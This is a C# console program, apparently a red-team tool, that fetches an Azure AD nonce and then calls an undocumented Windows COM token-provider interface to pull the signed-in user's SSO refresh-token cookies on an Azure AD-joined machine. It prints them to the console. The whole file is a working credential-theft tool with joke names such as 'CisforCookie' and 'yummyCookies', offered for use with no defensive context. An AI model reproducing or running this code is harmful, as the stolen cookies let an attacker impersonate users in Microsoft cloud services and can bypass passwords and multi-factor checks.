using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Http;
using Newtonsoft.Json;

namespace RequestAADSamlRefreshToken
{
    [StructLayout(LayoutKind.Sequential)]
    public class Poof
    {
        public string Name { get; set; }
        public string Data { get; set; }
        public uint Flags { get; set; }
        public string P3PHeader { get; set; }
    }

    public class jsonResponse
    {
        public string Nonce { get; set; }
    }

    public static class PoofManager
    {
        [Guid("CDAECE56-4EDF-43DF-B113-88E4556FA1BB")]
        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        internal interface IPoofManager
        {
            int CisforCookie(
                [MarshalAs(UnmanagedType.LPWStr)] string Uri,
                out uint yummyCookies,
                out IntPtr output
            );
        }

        [Guid("A9927F85-A304-4390-8B23-A75F1C668600")]
        [ComImport]
        private class WindowsTokenProvider
        {
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UnsafePoof
        {
            public readonly IntPtr NameStr;
            public readonly IntPtr DataStr;
            public readonly uint Flags;
            public readonly IntPtr P3PHeaderStr;
        }

        public static IEnumerable<Poof> CisforCookie(string uri)
        {
            var provider = (IPoofManager)new WindowsTokenProvider();
            var res = provider.CisforCookie(uri, out uint count, out var ptr);

            if (count <= 0)
                yield break;

            var offset = ptr;
            for (int i = 0; i < count; i++)
            {
                var info = (UnsafePoof)Marshal.PtrToStructure(offset, typeof(UnsafePoof));

                var name = Marshal.PtrToStringUni(info.NameStr);
                var data = Marshal.PtrToStringUni(info.DataStr);
                var flags = info.Flags;
                var p3pHeader = Marshal.PtrToStringUni(info.P3PHeaderStr);


                yield return new Poof()
                {
                    Name = name,
                    Data = data,
                    Flags = flags,
                    P3PHeader = p3pHeader
                };

                Marshal.FreeCoTaskMem(info.NameStr);
                Marshal.FreeCoTaskMem(info.DataStr);
                Marshal.FreeCoTaskMem(info.P3PHeaderStr);

                offset = (IntPtr)(offset.ToInt64() + Marshal.SizeOf(typeof(Poof)));
            }

            Marshal.FreeCoTaskMem(ptr);
        }
    }


    class Program
    {

        public static async Task<string> getNonce(string tenantID)
        {
            string url = "https://login.microsoftonline.com/" + tenantID + "/oauth2/token";
            HttpClient client = new HttpClient();
            var reqData = new Dictionary<string, string>
            {
                {"grant_type", "srv_challenge" }
            };
            var reqBody = new FormUrlEncodedContent(reqData);

            var response = await client.PostAsync(url, reqBody);

            var resBody = await response.Content.ReadAsStringAsync();

            jsonResponse j = JsonConvert.DeserializeObject<jsonResponse>(resBody);
            Console.WriteLine("[+] Received nonce: " + j.Nonce);
            return j.Nonce;
        }

        static void Main(string[] args)
        {
            try
            {
                string tenantID, nonce;
                if (args.Length > 0)
                {
                    tenantID = args[0];
                }
                else
                {
                    tenantID = "00000000-0000-0000-0000-000000000000";
                }

                Task<string> nonceTask = getNonce(tenantID);
                nonce = nonceTask.Result;

                var uris = new[] { "https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + nonce };

                foreach (var uri in uris)
                {
                    var cookies = PoofManager
                        .CisforCookie(uri)
                        .ToList();

                    Console.WriteLine($"[+] Uri: {uri}");

                    if (cookies.Any())
                    {
                        foreach (var c in cookies)
                        {
                            Console.WriteLine($"[+]    Name      : {c.Name}");
                            Console.WriteLine($"[+]    Flags     : {c.Flags}");
                            Console.WriteLine($"[+]    Data      : {c.Data}");
                            Console.WriteLine($"[+]    P3PHeader : {c.P3PHeader}\n");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"[!]    This did exactly SQUAT! No cookies received");
                        Console.WriteLine($"[!]    Make sure you are running this from an Azure AD-joined machine");
                        Console.WriteLine($"[!]    Did you at least catch your first tube today?");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Unhandled exception: " + e);
            }

            Console.WriteLine("[+] WOOOOO Have a nice day!");
            return;
        }
    }
}